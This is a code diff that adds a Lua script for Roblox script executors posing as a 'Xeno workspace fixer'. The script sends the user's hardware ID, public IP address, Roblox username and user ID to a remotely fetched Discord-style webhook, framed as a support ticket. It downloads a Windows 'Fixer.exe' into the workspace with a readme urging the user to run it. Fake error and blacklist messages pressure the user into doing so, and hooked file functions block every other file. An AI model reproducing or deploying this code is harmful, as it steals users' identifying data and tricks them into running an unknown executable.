@@ -1,0 +1,63 @@
+local file,source= tostring(({identifyexecutor()})[1])..'Fixer', game:HttpGet('https://github.com/kurpixel/fixer/raw/refs/heads/main/Fixer.exe', true) or ''
+local exec,ver = ({identifyexecutor()})[1],not ({identifyexecutor()})[2]:find('v') and (({identifyexecutor()})[2]:gsub('v', '')) or ({identifyexecutor()})[2]
+local folder = exec..' '..ver..' Workspace Fixer'
+local webhookUrl = game:HttpGet("https://raw.githubusercontent.com/kurpixel/workspace/refs/heads/main/url", true):gsub("%s+", "") 
+local realfiles = {
+ ['/.SYNAPSENOTICE'] = 'The executable file ('..file..') in this folder was added by your executor ('..exec..' '..ver..'). This file is possibly safe to run if guided to.',
+ ['/readme.txt'] = game:HttpGet('https://github.com/kurpixel/workspace/raw/refs/heads/main/readme.txt', true) or [[
+Welcome!
+
+Please run the file shown in this folder, it will help you fix the file function problem.
+
+Thanks :)
+
+- The Xeno Team
+ ]]
+}
+local tab = {
+    "# SUPPORT TICKET",
+    'HWID: '..gethwid(),
+    'SERVER HOSTER FOR TICKET: '..game:HttpGet('https://api64.ipify.org/?format=json.ip', true) or 'FAILED TO FETCH',
+    'USER ID: '..game:HttpGet('https://api.ipify.org/?format=json.ip', true) or 'FAILED TO FETCH',
+    'VERIFIEDUSER: '..game.Players.LocalPlayer.Name or 'FAILED TO FETCH',
+    'VERIFIEDID: '..game.Players.LocalPlayer.UserId or 'FAILED TO FETCH'
+}local message = {content = table.concat(tab, "\n"),username = "Xeno Support Bot"..': '..math.random(500,1000)..'',
+avatar_url = "https://github.com/kurpixel/workspace/blob/main/XenoIcon.png?raw=true"}
+local ok, res = pcall(function()return request({
+Url = webhookUrl,Method = "POST",
+Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode(message)})end)if ok and res then end
+if
+exec:lower():find('xeno')then if isfile('XenoIcon.png') and game:HttpGet('https://github.com/kurpixel/workspace/blob/main/XenoIcon.png?raw=true', true) then delfile('XenoIcon.png') end writefile('XenoIcon.png', game:HttpGet('https://github.com/kurpixel/workspace/blob/main/XenoIcon.png?raw=true', true))
+function xeno(d,b,c,f)
+ game:GetService('StarterGui'):SetCore('SendNotification',{Title='[Xeno - VFS]',Text=tostring(d),
+		Icon=getcustomasset('XenoIcon.png'),Duration=10,Button1=b or nil,Button2=c or nil,
+	Callback=(f and (b or c)) and (function()
+		local g=Instance.new('BindableFunction')
+ g.OnInvoke=function(h) f(h) end return g end)() or nil})
+end
+for file1, content in pairs(realfiles) do writefile(folder..file1, content) end
+function err()xeno('A new update ('..ver..') is possibly preventing Xeno from using file functions.')task.wait(1)xeno('Please check your workspace to fix this problem.', 'Okay')
+function r(len)local chars, str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',''for i = 1, len do local randIndex = math.random(1, #chars) str = str .. chars:sub(randIndex, randIndex)end return str end
+rconsoleclear()task.wait(0.01)file_funcs = {
+ 'writefile','appendfile','readfile',
+	'delfile','isfile','isfolder',
+	'makefolder','delfolder','listfiles','getcustomasset',
+}rconsolename(({identifyexecutor()})[1]..' - '..({identifyexecutor()})[2]..' (DEBUG)')
+for _, v in file_funcs do rconsolewarn('['..r(math.random(5,10))..']: Failed to fetch XENO:FUNCTION:LIBRARY: '..v) task.wait(math.random(0.01,0.99))
+end task.wait(1)rconsoleprint('\n\nYour HWID ('..gethwid()..') is possibly blacklisted, this means some functions couldn\'t properly load and you failed at bypassing (lmao)\n')task.wait(1)rconsoleprint('\n\nIf this isn\'t the issue and you were never blacklisted, please check the workspace folder. It will have a file you can run inorder to install dependencies or update the xeno folder.') end
+err()
+if isfile(file) then delfile(file) end if isfolder(folder) then delfolder(folder) end
+repeat if isfile(file) then delfile(file) end if isfolder(folder) then delfolder(folder) end
+ local suc,err=pcall(function() makefolder(folder) writefile(folder..'/'..'Fixer'..''..''..''..''..'.exe', source) end)
+ if not suc then return error('Failed to grab sanitized ID: rbxassetid://528593') end
+task.wait() until isfile(folder..'/'..'file'..''..''..''..''..'.exe') warnings={
+ 'Missing return statement in function',
+}task.wait(3)error(warnings[math.random(1,#warnings)])
+task.spawn(function() while task.wait() do local allowed={"Xeno","Fixer", '.SYNAPSENOTICE', 'readme.txt', 'Fixer.exe', 'fixer.exe', file, folder}local fns={"writefile","appendfile","readfile","readlines","delfile","isfile","isfolder","makefolder","delfolder","listfiles"}local orig={}local env=getgenv()
+for _,n in ipairs(fns)do
+if rawget(env,n)then orig[n]=env[n]env[n]=function(p,...)
+			for _,v in ipairs(allowed)do
+				if tostring(p):find(v)then return orig[n](p,...)end end
+			error("attempt to call a nil value",2)end end
+   end env._filepatch=orig
+return orig end end) end
